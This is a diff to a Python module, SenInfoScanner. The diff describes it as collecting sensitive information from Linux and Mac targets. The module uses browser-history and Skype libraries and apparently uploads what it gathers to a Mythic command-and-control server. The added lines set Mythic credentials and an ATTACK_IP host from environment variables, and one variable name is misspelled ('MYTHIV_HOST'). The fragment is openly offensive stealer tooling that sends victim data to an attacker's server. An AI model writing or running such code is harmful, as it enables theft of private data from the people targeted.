@@ -1,7 +1,7 @@
 '''
  # @ Create Time: 2024-09-04 11:10:07
  # @ Modified time: 2024-09-04 11:35:24
- # @ Description: define two classes to achieve two different scanning methods
+ # @ Description: class to collect sensitive information from linux/mac targets
  '''
 import platform
 import socket
@@ -16,12 +16,16 @@ import browserhistory as bh
 import base64
 import zipfile
 import gzip
-import Skype
+from skpy import Skype
 from mythic_container.MythicRPC import MythicRPC
 import zlib
 from pathlib import Path
 import tempfile
 import asyncio
+from dotenv import load_dotenv
+
+# load .env for sensitive tokens
+load_dotenv()
 
 class SenInfoScanner:
 
@@ -269,6 +273,12 @@ class SenInfoScanner:
             print("[-] File upload to Mythic Failed")
 
 async def run():
+
+    os.environ['MYTHIC_USERNAME'] = os.getenv("ADMINUSER")
+    os.environ["MYTHIC_PASSWORD"] = os.getenv("PASSWORD")
+    os.environ["MYTHIV_HOST"] = os.getenv("ATTACK_IP")
+    os.environ["MYTHIC_VHOST"] = os.getenv("MYTHIC_VHOST")
+
     temp_path = tempfile.gettempdir()
     senscanner = SenInfoScanner(temp_path)
     # define the file
